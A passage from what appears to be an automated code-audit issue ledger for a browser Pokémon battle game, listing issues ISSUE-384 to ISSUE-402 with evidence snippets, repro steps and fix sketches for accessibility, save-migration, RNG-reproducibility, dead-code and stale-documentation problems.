The 5× ratio of cold-to-warm confirms `_trainerPoolCache` (battle.html:34910) is doing its job — first call per (type+gens) key pays the full baseStats scan, subsequent calls hit the partition.

**Blast radius**: Each story battle = exactly one `rollTrainerTeam` call. At median < 1 ms it's invisible. The cache is correctly bounded at 48 entries with LRU-ish eviction (battle.html:35029). Worth flagging in case the upcoming difficulty rework on `claude/eloquent-maxwell-I4Uql` introduces per-turn re-rolls or per-player adaptive picks — at that point the 1.4 ms cold cost compounds.

**Fix sketch**: No fix required today; the cache eviction at >48 entries is the correct upper bound for the cache key space (10 single types × 9 gen combinations × bosses ≈ 30–40 keys per save). If a future refactor invalidates the cache on every battle (e.g. "boss-specific filters"), revisit.

**Verification**: Re-bench after any difficulty-rework merge that touches `_trainerPoolCache` invalidation; threshold for concern is median > 5 ms or cold-pass p95 > 15 ms.

---

## <a id="ISSUE-384"></a> ISSUE-384: Safari flee-risk surfaced in color (orange #ff7043) and small 10px text only

---
id: ISSUE-384
severity: P3
category: contrast
anchor_symbol: safariActionRow
current_line_hint: ~49255
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: c8afef0751b9
confidence: low
status: open
---

**Title**: Safari flee-risk surfaced in color (orange #ff7043) and small 10px text only

**Evidence**:
```html
<span style="font-size:10px;">→ <span style="color:#aed581;">${_baitProjPct}%</span> · <span style="color:#ff7043;">flee ${_baitTurnPct}%</span></span>
```
The Safari bait/rock buttons encode upside (green `#aed581`) vs risk (orange `#ff7043`) purely by color at 10px. Both are prefixed with text labels ("flee N%") so it is NOT strictly color-only (passes the colorblind bar), but `#ff7043` on the `rgba(20,28,40,0.6)` button is ~3.1:1 — under AA for 10px text. The green `#aed581` passes. Minor; the literal word "flee" carries the meaning regardless.

**Repro**: Safari Zone encounter; inspect bait/rock projected-stat text.

**Blast radius**: `screen-story-catch` Safari mode action buttons.

**Fix sketch**: Bump the orange toward `#ff8a65`/`#ffab91` (already used for the Rock border at 3.5:1+) or raise font-size to 11px.

**Verification**: Contrast checker on the orange flee text >=4.5:1.

---

## <a id="ISSUE-385"></a> ISSUE-385: Move-test generator strips apostrophes, and the engine silently runs unknown move names as a 187-dmg fallback

---
id: ISSUE-385
severity: P3
category: dx
anchor_symbol: safeName
current_line_hint: ~18
file: tests/audit/generate-move-tests.js
agents: [test-coverage-filler]
fingerprint: 99aa9ad46225
confidence: high
status: open
---

**Title**: Move-test generator strips apostrophes, and the engine silently runs unknown move names as a 187-dmg fallback

**Evidence**:
```js
function safeName(s) { return s.replace(/[`"']/g, ''); }   // generate-move-tests.js:18
// -> it.todo('Kings Shield'), 'Lands Wrath', 'Natures Madness', 'Forests Curse'
// Filling a todo with the displayed (stripped) name tests a FALLBACK, not the move:
//   "Land's Wrath"=152 vs "Lands Wrath"=187 ; "Nature's Madness"=165 vs "Natures Madness"=187 ; "Forest's Curse"=0 vs 187
```

**Repro**: jsdom harness — `mkMon({moves:['Kings Shield',...]})` does not block (Body Slam connects 58) while `"King's Shield"` blocks (0). Any unknown move name resolves to a ~187-dmg default rather than erroring.

**Blast radius**: Test-only hazard, but a sneaky one: a mistyped/stripped move name passes a "deals damage" assertion against the wrong move. Bit two of this pass's own drafts before correction.

**Fix sketch**: Either don't strip apostrophes in safeName (only escape for the JS string literal), or make buildPokemon throw / warn on an unknown move name instead of falling back to a damaging default.

**Verification**: Generated todo titles match the canonical move names; an unknown move name throws in the harness.

---

## <a id="ISSUE-386"></a> ISSUE-386: SAVE_VER=23 but migration chain stops at `_loadedVer < 22` — no migrateStoryPreV23, no boot shadow-validation

---
id: ISSUE-386
severity: P3
category: dx
anchor_symbol: SAVE_VER
current_line_hint: 34369 (=23); migration chain ends at _loadedVer<22 (35596)
file: battle.html
agents: [story-mode-investigator]
fingerprint: 35442eebd3b2
confidence: high
status: fixed-claude/relaxed-bell-2X3Ys
---

**Title**: SAVE_VER=23 but migration chain stops at `_loadedVer < 22` — no migrateStoryPreV23, no boot shadow-validation

**Evidence**:
```js
const SAVE_VER = 23;                                  // battle.html:34369
// last migration in load(): if (_loadedVer < 22) { migrateStoryPreV22(); }   (35596)
// there is no migrateStoryPreV23 and no `if (_loadedVer < 23)` block.
```

**Repro**: `grep -n 'migrateStoryPreV23\|_loadedVer < 23' battle.html` → 0 hits. A v22 save loading into a v23 build passes the version guard, runs no v22→v23 migration, and is stamped v23. Harmless IF the v23 schema delta is roll-time-only (the build-power-tier `powerTier` field is computed, not stored), but the gap is undocumented and mirrors prior-audit ISSUE-169 (v20 bumped without a migration).

**Blast radius**: Migration chain completeness / future-proofing. No current crash (round-trip is clean — verified via story-flow + save-migration integration tests passing), but the next schema change at v23/24 risks landing on top of an unmigrated field silently.

**Fix sketch**: Either add a no-op `migrateStoryPreV23` with a comment explaining the v23 bump was field-free, or add the boot-time shadow-validation the prior audit recommended (ISSUE-134) that logs when SAVE_VER outpaces the highest migration. pasteur owns the schema bump rationale.

---

## <a id="ISSUE-387"></a> ISSUE-387: All 24 `#screen-*` containers are plain `<div>` — no `<main>` or `role="region"`

---
id: ISSUE-387
severity: P3
category: a11y
anchor_symbol: screen-landmarks
current_line_hint: ~7400
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: ade33e34d4e7
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: All 24 `#screen-*` containers are plain `<div>` — no `<main>` or `role="region"`

**Evidence**:
```
$ grep -nE 'id="screen-[a-z-]+"' battle.html | head -5
7400:    <div id="screen-menu" class="screen active">
7490:    <div id="screen-draft" class="screen hidden" …>
7786:    <div id="screen-story-menu" class="screen hidden story-screen-outer">
7811:    <div id="screen-story-city" class="screen hidden story-screen-root" …>
7856:    <div id="screen-story-professor" class="screen hidden story-screen-root" …>
…
8496:    <div id="screen-battle" class="screen hidden">
```

24 top-level screens (menu, draft, story-menu, story-city, story-shop, story-tutor, story-evtrainer, story-pokemoncenter, story-casino, story-catch, story-link, story-evolab, story-gameover, story-artifacts, story-tester, story-trainercreate, collection, battle, plus 6 more). None use a landmark element. Screen readers see "main content" as one undifferentiated blob: the assistive nav-by-landmark shortcut produces zero hits.

**Repro**: Open VoiceOver rotor (VO+U) → Landmarks. Nothing for any screen.

**Blast radius**: One of the cheapest a11y wins available — affects landmark navigation across the entire game.

**Fix sketch**: At minimum, change the currently-active `#screen-*` to behave as `<main>` (only one main per page). Mechanically: keep the `<div>` tag but add `role="main"` to whichever screen is active (toggle in the existing show-screen helper), and `role="region" aria-labelledby="<screen-heading-id>"` on the rest. Each screen already has an `<h1>`/`<h2>` near the top — give it an id and label by it.

**Verification**: VoiceOver landmark count ≥ 1; rotor labels match the active screen name.

---

## <a id="ISSUE-388"></a> ISSUE-388: Several story-mode dev seeds use `Math.random` for build / sprite picks, breaking seeded replays when debug seeds are in play

---
id: ISSUE-388
severity: P3
category: bug
anchor_symbol: seedDebugMysteryLegendGate
current_line_hint: ~35548
file: battle.html
agents: [story-mode-investigator]
fingerprint: 90afbb333f6a
confidence: low
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Several story-mode dev seeds use `Math.random` for build / sprite picks, breaking seeded replays when debug seeds are in play

**Evidence**:
```js
// battle.html ~35548 (seedDebugMysteryLegendGate)
const filler = ['Bulbasaur','Charmander','Squirtle','Caterpie','Weedle','Pidgey'];
// later: const pick = filler[Math.floor(Math.random() * filler.length)];

// Also lines 35774 / 35657 / 35651: testmega seeds also use Math.random / state.
```
Dev seeds are not exercised in shipped runs (they're gated by `?debugMystery=1` / localhost). But if a developer is hunting a story bug under `?seed=X&debugMystery=1`, the dev seed will fork the RNG state — they can't reproduce the seeded sequence after the dev seed runs.

**Repro**: Run `?seed=12345&debugMystery=1`, fire `seedDebugMysteryLegendGate`. The team it injects differs across reloads.

**Blast radius**: Dev-only ergonomic issue. No production-user impact.

**Fix sketch**: Route the picks through `storyRngNext` (or a `_storyDebugRng` if you want dev seeds isolated from the main RNG stream). Or document that dev seeds intentionally fork the RNG.

**Verification**: With the fix, `?seed=12345&debugMystery=1` produces the same injected team across reloads.

---

## <a id="ISSUE-389"></a> ISSUE-389: End-of-turn residual logic is duplicated verbatim in forced-switch path and main loop — divergence risk

---
id: ISSUE-389
severity: P3
category: inconsistency
anchor_symbol: selectPartyMember
current_line_hint: ~19373
file: battle.html
agents: [battle-engine-debugger]
fingerprint: d7d32448cfd3
confidence: high
status: open
---

**Title**: End-of-turn residual logic is duplicated verbatim in forced-switch path and main loop — divergence risk

**Evidence**:
```js
// selectPartyMember forced path (19373-19383) — duplicate of main loop (20128-20138):
runVolatileTimers(); runWishHealing();
endOfTurnEffects(state.pActive, state.fActive); endOfTurnEffects(state.fActive, state.pActive);
tickWeather();
if (state.pActive.dynamaxed) { state.pActive.dynamaxTurns--; ... }
```

**Repro**: Two byte-identical residual blocks (lines 19373-19383 and 20128-20138). The forced-switch copy IS wrapped by the try/catch at 19328-19422 (good — it recovers the lock), but any future fix to one block (e.g. adding the guards from the P1 findings) must be mirrored or behavior diverges between "switched-this-turn" and "stayed-in" turns. The forced-switch copy also still has the unguarded `state.pActive.dynamaxed` access, just with recovery.

**Blast radius**: Maintenance hazard; EoT semantics could silently differ after a forced switch vs a normal turn.

**Fix sketch**: Extract a single `runEndOfTurnResiduals()` helper called from both sites; apply the guards there once.

**Verification**: Diff EoT log output for a turn with vs without a mid-turn forced switch under the same seed.

---

## <a id="ISSUE-390"></a> ISSUE-390: Player gimmick-unlock order shifts when a mechanic is disabled in settings — DMax unlocks at Gym 5 instead of Gym 6 if Mega is off

---
id: ISSUE-390
severity: P3
category: dx
anchor_symbol: settings.megaOn
current_line_hint: ~38242
file: battle.html
agents: [story-mode-investigator]
fingerprint: 671336517e09
confidence: medium
status: open
---

**Title**: Player gimmick-unlock order shifts when a mechanic is disabled in settings — DMax unlocks at Gym 5 instead of Gym 6 if Mega is off

**Evidence**:
```js
// battle.html ~38240  (in onGymVictory handler)
const order = [];
if (sm.settings.megaOn) order.push('mega');
if (sm.settings.dynaOn) order.push('dmax');
if (sm.settings.teraOn) order.push('tera');
if (sm.settings.zOn) order.push('z');
const badges = sm.badges | 0;
const slotsUnlocked = badges < 5 ? 0 : Math.min(4, badges - 4);
sm.unlockedGimmicks = order.slice(0, Math.min(slotsUnlocked, order.length));
```
At badges=5 with all four mechanics enabled: unlock = `['mega']`. At badges=5 with only Dyna enabled: unlock = `['dmax']` (jumped DMax up to slot 1). The unlock schedule is condensed against the order array, so the "first unlock at GL5, full set at GL8" curve compresses or shifts when a setting is off.

**Repro**: New run with Mega disabled in Settings. Beat GL5. `sm.unlockedGimmicks = ['dmax']` (instead of empty). DMax is now available at GL5's first reveal fight, despite the spec/CHANGELOG framing GL5 as "the unlock-reveal fight" for Mega specifically.

**Blast radius**: Subtle balance / pacing issue. The CHANGELOG narrative ("from Gym 5 onwards the catches can only roll from the mechanics the player has actually earned") still holds — but the *which* mechanic players first encounter is wrong. A pure-DMax-only run gets DMax at GL5 instead of GL6.

**Fix sketch**: Either (a) accept the compression as intentional (no action), or (b) anchor the unlock by badges:
```js
const planned = ['mega', 'dmax', 'tera', 'z'];
const slot = Math.max(0, badges - 4);
const newlyUnlocked = planned.slice(0, slot).filter(k => settingForMech(k));
sm.unlockedGimmicks = newlyUnlocked;
```
So at badges=5 with only Dyna on, `unlockedGimmicks` is `[]` until GL6 (dmax's natural slot).

**Verification**: Disable Mega in Settings; after GL5, `sm.unlockedGimmicks` should be `[]` (option b) or `['dmax']` (option a). Match whichever behavior the design intends.

---

## <a id="ISSUE-391"></a> ISSUE-391: `shouldForceCityProfessor` uses dead `sm.team.length < 6` floor that's shadowed by outer `hasTeamRoom` gate

---
id: ISSUE-391
severity: P3
category: refactor
anchor_symbol: shouldForceCityProfessor
current_line_hint: ~28822
file: battle.html
agents: [story-mode-investigator]
fingerprint: e8d8ed327813
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `shouldForceCityProfessor` uses dead `sm.team.length < 6` floor that's shadowed by outer `hasTeamRoom` gate

**Evidence**:
```js
// battle.html ~28809
function shouldForceCityProfessor(cityIdx, actions) {
    if (c >= 9) return false;
    if (...) return false;
    if (isPreLeagueLegendaryMysteryGate(c)) return true;
    if (_isPostGymHubAtEventIdx(...)) return false;
    return sm.team.length < 6;   // ← uses hard-coded 6
}

// battle.html ~35931 (caller in renderCityActions)
const _partyCap = _storyMaxPartySize();   // 2..6
const hasTeamRoom = sm.team.length < _partyCap;
const hasProf = (hasBaseProf || shouldForceCityProfessor(cityIdx, actions))
              && (hasTeamRoom || _legendaryGateHere);
```
The `< 6` floor in `shouldForceCityProfessor` is functionally dead: any time it returns `true` with `team.length >= _partyCap`, the outer `&& hasTeamRoom` clause flips the result to `false` anyway. The two formulas should match for clarity, or the inner check should just be `return true;`.

**Repro**: Inspect `shouldForceCityProfessor` semantics. Any test where team.length >= partyCap but < 6 (e.g. badges=2, team=4) reaches the `team.length < 6 = true` branch, but the outer `hasTeamRoom = (4 < 4) = false` overrides it.

**Blast radius**: Logic-only smell, no user-visible bug today. Future contributors trying to reason about Professor visibility see two different cap formulas (`< 6` vs `< _partyCap`) and lose time triangulating.

**Fix sketch**: Replace the inner check with `return sm.team.length < _storyMaxPartySize();` — or just `return true;`, since the outer caller already gates on `hasTeamRoom`. Adds a small consistency win.

**Verification**: After fix, both call sites express the same cap formula.

---

## <a id="ISSUE-392"></a> ISSUE-392: `shouldForceCityProfessor`'s `sm.team.length < 6` floor is dead-coded once the outer `hasTeamRoom` gate clamps to `_storyMaxPartySize()`

---
id: ISSUE-392
severity: P3
category: dx
anchor_symbol: shouldForceCityProfessor
current_line_hint: ~28822
file: battle.html
agents: [story-mode-investigator]
fingerprint: 3db327ab351c
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `shouldForceCityProfessor`'s `sm.team.length < 6` floor is dead-coded once the outer `hasTeamRoom` gate clamps to `_storyMaxPartySize()`

**Evidence**:
```js
// battle.html ~28809
function shouldForceCityProfessor(cityIdx, actions) {
    if (c >= 9) return false;
    if (Array.isArray(actions) && actions.includes('Professor')) return false;
    if (isPreLeagueLegendaryMysteryGate(c)) return true;
    if (_isPostGymHubAtEventIdx(...)) return false;
    return sm.team.length < 6;   // ← effectively dead
}

// battle.html ~35931 (caller in renderCityActions)
const _partyCap = _storyMaxPartySize();   // 2..6
const hasTeamRoom = sm.team.length < _partyCap;
const hasProf = (hasBaseProf || shouldForceCityProfessor(cityIdx, actions))
              && (hasTeamRoom || _legendaryGateHere);
```

Two cap formulas in the same flow: `< 6` (inner) and `< _partyCap` (outer). The outer one always shadows the inner when they disagree. Either condition is dead code or a maintainability hazard.

**Repro**: At 2 badges with team=4 (cap=4): `shouldForceCityProfessor` returns `4 < 6 = true`; but `hasTeamRoom = 4 < 4 = false`; so `hasProf = false`. The `< 6` branch did no work.

**Blast radius**: Code-clarity smell. Two formulas describing the same gate is a future-edit footgun.

**Fix sketch**: Either replace `sm.team.length < 6` with `sm.team.length < _storyMaxPartySize()`, or just `return true;` (since the outer caller does the cap check anyway). Pair with fingerprint `e8d8ed327813`.

**Verification**: After fix, both call sites express the same cap formula.

---

## <a id="ISSUE-393"></a> ISSUE-393: Stale comment claims rival secondary intro "Uses Math.random" — it now uses seeded _storySideRng

---
id: ISSUE-393
severity: P3
category: inconsistency
anchor_symbol: showBattleIntro
current_line_hint: ~42101
file: battle.html
agents: [story-mode-investigator]
fingerprint: 691dc8480b55
confidence: high
status: open
---

**Title**: Stale comment claims rival secondary intro "Uses Math.random" — it now uses seeded _storySideRng

**Evidence**:
```js
// battle.html:42101 (comment) — INCORRECT
// "...Uses Math.random for rival secondary line only — does not advance story battle RNG."
// but battle.html:42121 calls:
const extraLine = ... pickRivalSecondaryIntroLine(rivalPhase, badgesNow);
// which uses _storySideRng(seed, phase, badges) — deterministic (30755)
```

**Repro**: `pickRivalSecondaryIntroLine` (battle.html:30766) draws via `_storySideRng(...)` (30755), a "Deterministic per-(seed, phase, badges) sub-RNG … reproducible across shared seeds." This FIXES prior audit finding 1.1. The comment at 42101 was never updated and now mis-states the implementation.

**Blast radius**: Comment-only; misleads future maintainers into thinking shared-seed replays diverge on the rival line (they don't).

**Fix sketch**: Update the comment to "rival secondary line uses a deterministic seed-derived sub-RNG (`_storySideRng`); does not touch story battle RNG state."

**Verification**: Comment matches `pickRivalSecondaryIntroLine`.

---

## <a id="ISSUE-394"></a> ISSUE-394: Mobile move-details "i" is a span[role=button] with no tabindex/keydown — keyboard cannot reach it

---
id: ISSUE-394
severity: P3
category: a11y
anchor_symbol: showMoves
current_line_hint: ~18146
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 35644feb52ad
confidence: high
status: open
---

**Title**: Mobile move-details "i" is a span[role=button] with no tabindex/keydown — keyboard cannot reach it

**Evidence**:
```js
let infoHit = isMobile ? '<span class="move-info-hit" title="Move details" role="button">i</span>' : '';
// later: hit.addEventListener('click', ...openStickyMoveTooltip)  // click only — no keydown, no tabindex
```

**Repro**: On a touch+keyboard device (or mobile emulation with a BT keyboard), open Fight. The per-move "i" affordance has `role="button"` but no `tabindex="0"` and no `keydown` handler, so it never receives focus and Enter/Space do nothing. It is the only path to the full move tooltip on mobile layouts (desktop uses hover). Note: the move `<button>` itself carries a rich `aria-label` (L18148), so SR users still get the summary — this is a focusability/parity gap, not a total loss.

**Blast radius**: Mobile/portrait + tablet battle move menu. Mirrors the desktop tooltip being `onmousemove`-gated (already filed) but is a distinct element/control.

**Fix sketch**: Make it a real `<button type="button">` (preferred) or add `tabindex="0"` + a `keydown` handler firing on Enter/Space; give it an `aria-label` like "Show full details for <move>".

**Verification**: Tab reaches the "i" control inside each move tile; Enter/Space opens the sticky tooltip.

---

## <a id="ISSUE-395"></a> ISSUE-395: Victory overlay auto-dismisses after 6s regardless of how much narrative it stacks — the biggest story beats can vanish before they're read

---
id: ISSUE-395
severity: P3
category: dx
anchor_symbol: showVictoryOverlay
current_line_hint: ~47154
file: battle.html
agents: [story-mode-investigator]
fingerprint: e5f5ed16bbbe
confidence: medium
status: open
---

**Title**: Victory overlay auto-dismisses after 6s regardless of how much narrative it stacks — the biggest story beats can vanish before they're read

**Evidence**:
```js
const autoClose = setTimeout(dismiss, 6000);
```
The overlay can render four stacked beats at once: per-leader victory line + LEADER_BADGE_REFLECTIONS + per-variant victory card + the cap-unlock teach (gym wins), or the Champion base line + first-clear epilogue, or the Mystery Figure unmasking reveal + outro. All share one fixed 6000ms timer that calls `cb()` (advances the story) on expiry. A reader on the Champion/Mystery/Gym-3 reveal can have the screen yank itself away mid-sentence.

**Repro**: Win Gym Leader 1 on a fresh run (leader line + reflection + variant card + "🎓 party cap is now 3" teach). Don't touch anything. At 6s the overlay advances on its own.

**Blast radius**: Cosmetic/UX only — no state corruption (dismiss is idempotent). Affects the single most rewarding moments of the run.

**Fix sketch**: Scale the auto-close to content length (e.g. `Math.max(6000, 2500 + textChars*35)`), or drop the auto-close entirely for `gotBadge`/milestone overlays and require an explicit Continue (Enter/Esc/click already dismiss).

**Verification**: Long-text overlays stay up until dismissed or for a content-proportional duration.

---

## <a id="ISSUE-396"></a> ISSUE-396: Subject Zero stored to PC (party-full at cage) shows "Subject Zero" nickname but is never auto-fielded — easy to miss the capstone mon

---
id: ISSUE-396
severity: P3
category: inconsistency
anchor_symbol: showVictoryOverlay
current_line_hint: ~49869
file: battle.html
agents: [story-mode-investigator]
fingerprint: fc1331e5a296
confidence: low
status: fixed-claude/cagedgod-excision
---

**Title**: Subject Zero stored to PC (party-full at cage) shows "Subject Zero" nickname but is never auto-fielded — easy to miss the capstone mon

**Evidence**:
```js
if (!partyFull) {
    sm.team.push(caught);
} else if (bossMode) {
    sm.pcBox.push(caught);   // capstone reward silently sent to PC, no swap prompt
}
```
The boss-arc catch deliberately skips the party-swap prompt ("the story beat needs the unique mon in your hand right now") — but if the party is already at the cap (6/6 post-HoF), Subject Zero goes to the PC with no prompt and the success message still reads as if it joined. A player at 6/6 finishes the climactic arc and the legendary is in storage, not their hand — undercutting the intended "in your hand right now" beat.

**Repro**: Post-HoF with a full 6/6 party, complete the cage. Subject Zero lands in PC, not party.

**Blast radius**: Endgame payoff framing. Narrow (only at 6/6), low severity.

**Fix sketch**: When party is full in bossMode, offer the same swap prompt as normal catches (or auto-swap the lowest-BST non-unsellable mon to PC and field Subject Zero), and adjust the success message to say where it went.

**Verification**: At 6/6, the player is told Subject Zero is in the PC, or is given a swap choice.

---

## <a id="ISSUE-397"></a> ISSUE-397: Inconsistent auto-dismiss across scene types — victory 6s timeout vs beat scenes never auto-dismiss

---
id: ISSUE-397
severity: P3
category: inconsistency
anchor_symbol: showVictoryOverlay
current_line_hint: ~48199
file: battle.html
agents: [story-mode-investigator]
fingerprint: 361a9dacf73d
confidence: high
status: open
---

**Title**: Inconsistent auto-dismiss across scene types — victory 6s timeout vs beat scenes never auto-dismiss

**Evidence**:
```js
// showVictoryOverlay: const autoClose = setTimeout(dismiss, 6000);   // vanishes after 6s
// _renderNarrativeOverlay (cold-opens, 3-track beats, post-battle): NO timer — waits for click/Enter.
// showBattleIntro: setTimeout(callback, isRivalBattle?3400:vsIsMajor?2900:2200);  // forced advance
```

**Repro**: A gym victory card that stacks the leader line + reflection + variant card + cap-teach can exceed 6s of reading and auto-dismisses mid-read (ledger ISSUE-343), while a one-line beat scene waits indefinitely for a click. Three different dwell models across adjacent surfaces in the same flow.

**Blast radius**: Reading/pacing consistency. The biggest narrative moment (victory + variant flavor) is the one that auto-vanishes; quieter beats persist. Inconsistent with the "one consistent flow" goal (deliverable 4).

**Fix sketch**: Standardize dwell behavior in the presentation registry — either all narrative overlays are click-to-continue (preferred for story beats + victory flavor), or the auto-timer scales with text length. Remove the fixed 6s from victory or make it reading-time-aware.

**Verification**: No story overlay auto-dismisses before its text can be read; dwell behavior is uniform by surface type.

---

## <a id="ISSUE-398"></a> ISSUE-398: Doc battle.html:LINE anchors are stale (23/43 drifted across the spec docs)

---
id: ISSUE-398
severity: P3
category: dx
anchor_symbol: spec-drift-doc-anchors
current_line_hint: ~52
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: 871a9024fe0b
confidence: high
status: open
---

**Title**: Doc battle.html:LINE anchors are stale (23/43 drifted across the spec docs)

**Evidence**:
```
STORY_MODE_FLOW.md:52       STORY_EVENTS_RAW   claims :21273  → now @30631
STORY_MODE_FLOW.md:588      makeWildBuild      claims :34883  → now @50253
docs/STORY_NARRATIVE_VARIANTS.md:612  STORY_BEATS         :30566  → now @39582
docs/STORY_NARRATIVE_VARIANTS.md:619  _showIntroRivalColdOpen :33069 → now @47259
docs/PROGRESSION_CURVE_MASTER.md:143  STORY_BUILD_TIER    :33298  → now @36884
docs/PROGRESSION_CURVE_MASTER.md:213  FACILITY_DEBUT_CITY :29085  → now @30708
```

**Repro**: `node scripts/debug/spec-drift.mjs` → tests/reports/spec-drift.md. 23 of 43 `battle.html:LINE` references no longer point at the symbol they name. The named SYMBOLS all still exist (resolve via find-anchor) — only the hard-coded line numbers drifted as battle.html grew. Representative sample above; not P1 because no feature is missing.

**Blast radius**: Doc-only. Any reader (or agent) who trusts the inline line numbers lands in the wrong region. Low risk because every doc already carries the symbol name alongside the number, and find-anchor resolves them.

**Fix sketch**: Drop hard-coded line numbers from the docs (keep symbol names only), or add a doc-lint step that rewrites `symbol (battle.html:N)` from the symbol index. Read-only for this auditor — flagging, not editing.

**Verification**: Re-run `node scripts/debug/spec-drift.mjs`; drifted count drops to 0 (or the numbers are removed entirely).

---

## <a id="ISSUE-399"></a> ISSUE-399: Mystery Figure identity is rolled at run start before sm.active/runSeed are live — not reproducible under fixed debug seeds

---
id: ISSUE-399
severity: P3
category: bug
anchor_symbol: startNewRun
current_line_hint: ~35714
file: battle.html
agents: [story-mode-investigator]
fingerprint: b61c4fb64fc9
confidence: medium
status: open
---

**Title**: Mystery Figure identity is rolled at run start before sm.active/runSeed are live — not reproducible under fixed debug seeds

**Evidence**:
```js
// inside the sm = { ... } object literal, evaluated BEFORE the assignment completes:
mysteryIdentity: _storyPickMysteryIdentity(),
// _storyPickMysteryIdentity uses bare Math.random() (lines ~30034/30042). The global
// Math.random monkeypatch (line ~32404) only seeds when the *current* sm.active &&
// sm.runSeed — but at literal-construction time sm still points at the prior/default state.
```

**Repro**: `startNewRun` builds the new `sm` literal with `mysteryIdentity: _storyPickMysteryIdentity()`. At that instant the module `sm` variable hasn't been reassigned, so the Math.random override (which gates on `sm.active && sm.runSeed != null`) reads the OLD state (default `active:false` on first run → native Math.random; or a stale prior run's seed). The Mystery identity is therefore NOT a function of the new run's seed. The debug seeds (`seedDebugMysteryLegendGate`, `seedDebugPostHofClimax`) pin runSeed for reproducible climax testing, but the masked-figure identity still varies. (Normal play is unaffected — seeds are auto-random per run now, so cross-run replay is moot.)

**Blast radius**: Reproducibility of the Mystery Figure climax under debug/test seeds only. No gameplay impact in normal runs. Prior audits flagged the bare-Math.random; the global monkeypatch added since covers most call sites but not this pre-assignment one.

**Fix sketch**: Roll `mysteryIdentity` AFTER the `sm = {...}` assignment and after `sm.active=true`/`runSeed` are set, OR pass the new runSeed explicitly into `_storyPickMysteryIdentity` and derive from it. Either makes the identity seed-deterministic.

**Verification**: Two `startNewRun` calls with the same forced runSeed produce the same `sm.mysteryIdentity`.

---

## <a id="ISSUE-400"></a> ISSUE-400: Row-67 `STORY_BEATS` still tags `'cagedGod'` + coldOpen `mystery67` — stale cut-arc residue in the live beat map

---
id: ISSUE-400
severity: P3
category: dx
anchor_symbol: STORY_BEATS
current_line_hint: ~39521
file: battle.html
agents: [story-mode-investigator]
fingerprint: 9b3fe50135f0
confidence: medium
status: fixed-claude/cagedgod-excision
---

**Title**: Row-67 `STORY_BEATS` still tags `'cagedGod'` + coldOpen `mystery67` — stale cut-arc residue in the live beat map

**Evidence**:
```js
67: { kind: 'mystery', tags: ['postHoFMystery', 'cagedGod'], coldOpen: 'mystery67' }
// 'cagedGod' tag survives the v24 arc cut. The coldOpen 'mystery67' still fires before the
// post-HoF Mystery Figure battle (row 67) — verify its prose doesn't promise the cut cage.
```

**Repro**: `grep -n "cagedGod" battle.html` → row-67 beat tag. The Caged-God arc was cut (v24, per STORY_MODE_FLOW §9 + CLAUDE.md) but the tag and the `mystery67` cold-open remain wired to the live row-67 fight. Part of the broader incomplete-excision cluster (see committed spec-drift/consistency partials + STORY_OVERHAUL_PLAN Phase B), surfaced here as a concrete live beat-map entry.

**Blast radius**: Low functional risk (tag is descriptive); but it is live code referencing cut content, and the `mystery67` cold-open prose should be audited for cage/broker promises (cross-refs the variant-dialogue finding).

**Fix sketch**: Drop the `'cagedGod'` tag from the row-67 beat; verify the `mystery67` cold-open prose describes only the shipped post-HoF Mystery Figure climax (no cage/broker). Fold into Phase B excision.

**Verification**: No live beat/tag/cold-open references the Caged God; row-67 cold-open prose matches the shipped climax.

---

## <a id="ISSUE-401"></a> ISSUE-401: Internal action keys use `Pokemon` (no diacritic) while UI labels use `Pokémon`

---
id: ISSUE-401
severity: P3
category: inconsistency
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~28028
file: battle.html
agents: [consistency-auditor]
fingerprint: 908671f1a52f
confidence: high
status: wontfix-internal-keys-stable-not-user-facing
---

**Title**: Internal action keys use `Pokemon` (no diacritic) while UI labels use `Pokémon`

**Evidence**:
```js
// L28028  '...,Power Up','Enter Pokemon League']],          ← action key
// L36151                       'Enter the Pokémon League'   ← UI label
// L28047  if (!Array.isArray(actions) || actions.includes('Pokemon Fan Club')) continue;
// L36242  makeActionBtn('💖 Pokémon Fan Club', ...           ← UI label
```

**Repro**: `grep -nE '\\bPokemon\\b' battle.html | grep -v 'Pokémon'` — 19 hits, 2 of which are user-string-adjacent action keys (rest are CSS / code comments).

**Blast radius**: None for users — internal keys, not displayed. Style consistency only. Risk: a future contributor updates one of these two strings to use the diacritic and forgets the matched site, breaking the `actions.includes(...)` check.

**Fix sketch**: Either (a) leave both as-is and document that internal action keys deliberately avoid the diacritic, or (b) rename both keys to use `Pokémon` + update both `actions.includes(...)` callsites. (a) is the lower-risk fix.

**Verification**: After rename, ensure City 9's "Enter Pokémon League" button still appears (the gating check at L36137 must match).

---

## <a id="ISSUE-402"></a> ISSUE-402: Doc line anchors stale — 18/50 `battle.html:LINE` refs in design docs no longer resolve (clustered)

---
id: ISSUE-402
severity: P3
category: dx
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~29240
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: 3aecea72ae27
confidence: high
status: open
---

**Title**: Doc line anchors stale — 18/50 `battle.html:LINE` refs in design docs no longer resolve (clustered)

**Evidence**:
```text
node scripts/debug/spec-drift.mjs → 18/50 battle.html:LINE refs drifted.
Representative examples (claimed line → symbol now lives at):
  STORY_MODE_FLOW.md:53   battle.html:21273  STORY_EVENTS_RAW   → now 29240
  STORY_MODE_FLOW.md:123  battle.html:28560  getMonGrade        → now 13893
  STORY_MODE_FLOW.md:584  battle.html:34883  makeWildBuild      → now 44684
  STORY_NARRATIVE_VARIANTS.md:612 battle.html:30566 STORY_BEATS  → now 35833
  PROGRESSION_CURVE_MASTER.md:181 battle.html:42146 (gimmick gate) → now ~42749/38575
```

**Repro**: `node scripts/debug/spec-drift.mjs` then read `tests/reports/spec-drift.md`.

